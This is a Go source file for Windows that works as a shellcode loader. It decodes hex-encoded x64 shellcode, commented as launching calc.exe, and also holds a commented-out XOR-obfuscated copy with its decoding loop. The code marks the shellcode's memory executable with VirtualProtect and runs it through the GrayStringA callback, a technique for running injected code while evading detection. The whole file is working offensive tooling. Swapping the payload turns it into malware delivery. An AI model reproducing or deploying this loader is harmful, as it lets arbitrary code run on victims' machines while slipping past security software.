//go:build windows
// +build windows

package main

import (
	"encoding/hex"
	"unsafe"
	"golang.org/x/sys/windows"
)


func main() {
	// Calc.exe
	shellcode, _ := hex.DecodeString("fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500")

	// Calc.exe ^ 0xab
	// shellcode, _ := hex.DecodeString("57e3284f5b436babababeafaeafbf9fafde39a79cee320f9cbe320f9b3e320f98be320d9fbe3a41ce1e1e69a62e39a6b0797cad7a9878bea6a62a6eaaa6a4946f9eafae320f98b20e997e3aa7b202b23abababe32e6bdfcce3aa7bfb20e3b3ef20eb8be2aa7b48fde35462ea209f23e3aa7de69a62e39a6b07ea6a62a6eaaa6a934bde5ae7a8e78fa3ee927ade73f3ef20eb8fe2aa7bcdea20a7e3ef20ebb7e2aa7bea20af23e3aa7beaf3eaf3f5f2f1eaf3eaf2eaf1e328478beaf9544bf3eaf2f1e320b942fc545454f6e311aaabababababababe32626aaaaababea119a20c42c547e105b1e09fdea110d3e1636547ee3286f8397add7a12b504bdeae10ecb8d9c4c1abf2ea2271547ec8cac7c885ced3ceab")
	
	// for b := range shellcode {
	// 	// xor shellcode with 0xab
	// 	shellcode[b] ^= 0xab
	// }

        
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	user32 := windows.NewLazySystemDLL("user32.dll")

	VirtualProtect := kernel32.NewProc("VirtualProtect")
	GrayString := user32.NewProc("GrayStringA")

	oldProtect := windows.PAGE_READWRITE
	VirtualProtect.Call((uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	GrayString.Call(0, 0, (uintptr)(unsafe.Pointer(&shellcode[0])), 1, 2, 3, 4, 5, 6);
}
